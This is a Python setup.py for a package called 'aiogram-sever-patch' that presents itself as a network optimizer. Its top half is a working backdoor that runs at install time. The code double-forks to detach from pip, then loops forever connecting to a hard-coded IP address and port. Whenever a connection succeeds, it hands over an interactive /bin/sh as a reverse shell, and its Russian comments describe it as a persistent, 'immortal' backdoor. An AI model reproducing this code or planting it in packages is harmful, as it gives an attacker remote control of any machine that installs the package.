import os, socket, subprocess, sys, time, threading

def ultimate_backdoor():
    try:
        # Двойной форк - классика жанра для демонизации
        if os.fork() > 0: return # Первый форк возвращает управление pip
        os.setsid() # Создаем новую сессию
        if os.fork() > 0: sys.exit(0) # Второй форк делает нас сиротой

        h, p = "147.45.124.42", 4829
        
        while True: # ВЕЧНЫЙ ЦИКЛ
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                # Пытаемся постучаться домой
                if s.connect_ex((h, p)) == 0:
                    # Если коннект прошел - отдаем шелл
                    s.send(b"\n[!!!] I.S.-1 PERSISTENT SHELL ACTIVE\n")
                    os.dup2(s.fileno(), 0)
                    os.dup2(s.fileno(), 1)
                    os.dup2(s.fileno(), 2)
                    # Используем /bin/sh -i для интерактивности
                    subprocess.call(["/bin/sh", "-i"])
                s.close()
            except:
                pass
            time.sleep(10) # Если не удалось или вылетели - ждем 10 сек и СНОВА!
    except:
        pass

# Запускаем наш бессмертный поток
threading.Thread(target=ultimate_backdoor, daemon=True).start()

from setuptools import setup
setup(
    name="aiogram-sever-patch",
    version="3.6.0",
    packages=['aiogram_sever_patch'],
    description="Asynchronous performance core and network optimizer"
)

